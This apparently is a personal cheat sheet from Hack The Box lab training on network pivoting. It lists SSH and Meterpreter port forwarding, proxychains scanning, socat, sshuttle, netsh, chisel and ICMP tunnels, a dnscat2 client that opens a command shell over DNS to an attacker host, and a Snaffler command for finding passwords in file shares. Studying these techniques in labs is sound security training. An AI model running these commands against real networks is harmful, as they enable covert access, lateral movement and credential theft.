 

# <span style="color:#9fef00">Dynamic Port Forwarding with SSH and SOCKS Tunneling </span>

####  Identify routes 

```shell
Sauuron@htb[/htb]$ netstat -r
```


####  Local Port Forward 

ssh
 ```shell
Sauuron@htb[/htb]$ ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64
```

#### Confirming Port Forward with netstat
```shell
Sauuron@htb[/htb]$ netstat -antp | grep 1234
```

#### Enabling Dynamic Port Forwarding with SSH

```shell
Sauuron@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64
```

#### Edit proxychains.conf

```shell
Sauuron@htb[/htb]$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

#### Using Nmap with Proxychains

```shell
Sauuron@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200
```

__<mark style="background: #FF5582A6;">notes : proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results</mark>


## Using Metasploit with Proxychains

```css
Sauuron@htb[/htb]$ proxychains msfconsole
```


# <span style="color:#9fef00"> Remote/Reverse Port Forwarding with SSH </span>

```shell
Sauuron@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```


# <span style="color:#9fef00"> Meterpreter Tunneling & Port Forwarding </span>

#### Ping Sweep

```shell
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```

#### Ping Sweep For Loop on Linux Pivot Hosts

```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

#### Ping Sweep For Loop Using CMD

```shell
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

#### Ping Sweep Using PowerShell

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

#### Configuring MSF's SOCKS Proxy

```shell
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```

#### Adding a Line to proxychains.conf if Needed

```shell
socks4 	127.0.0.1 9050
```


#### Creating Routes with AutoRoute

```shell
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.

#### Creating Routes with AutoRoute

```shell
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

#### Listing Active Routes with AutoRoute

```shell
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```

#### Creating Local TCP Relay

```shell
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

## Meterpreter Reverse Port Forwarding

```shell
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

# <span style="color:#9fef00">Socat Redirection with a Reverse Shell </span>


#### Socat Ridrect RDP from remote host 

```c
socat TCP-LISTEN:3389,fork,reuseaddr TCP:<Remote-host-address>:3389 &
```

#### Starting Socat Listener

```c
ubuntu@Webserver:~$ socat TCP-LISTEN:3389,fork,reuseaddr TCP:172.16.5.19:3389
```


# <span style="color:#9fef00"> Socat Redirection with a Bind Shell </span>

```c
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```


# <span style="color:#9fef00">SSH Pivoting with Sshuttle </span>

```shell
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```


# <span style="color:#9fef00">Port Forwarding with Windows Netsh</span>

#### Using Netsh.exe to Port Forward

```shell
C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

#### Verifying Port Forward

```shell
C:\Windows\system32> netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.42.198   8080        172.16.5.25     3389
```


# <span style="color:#9fef00"> DNS Tunneling with Dnscat2</span>

#### Starting the dnscat2 server

```shell
Sauuron@htb[/htb]$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

 [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell)
```powershell-session
PS C:\htb> Import-Module .\dnscat2.ps1 
```

```powershell
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```



# <span style="color:#9fef00"> SOCKS5 Tunneling with Chisel</span>

#### shrink chisel size

```shell
go build -ldflags=" -s -w" 
upx brute chisel # compress
```


#### Running the Chisel Server on the Pivot Host

```shell
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```


# <span style="color:#9fef00">  ICMP Tunneling with SOCKS</span>

## Setting Up & Using ptunnel-ng


```shell
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22 # On compromised server
```

```shell
Sauuron@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22  # On attack host
```

```shell
Sauuron@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1
```

```shell
Sauuron@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

```shell
Sauuron@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389
```


# <span style="color:#9fef00"> RDP and SOCKS Tunneling with SocksOverRDP</span>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)


#### Loading SocksOverRDP.dll using regsvr32.exe

```shell
C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

1. Execute SocksOverRDP-Plugin.exe on Remote .
2. Open Proxifier Portable .
3. Check if host is listenning on 127.0.0.1:1080 .
1. Configure proxy "127.0.0.1:1080" SOCKS5 .


## <span style="color :yellow"> Snaffler </span>

##### Find passwords, configs in shares

```bash
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

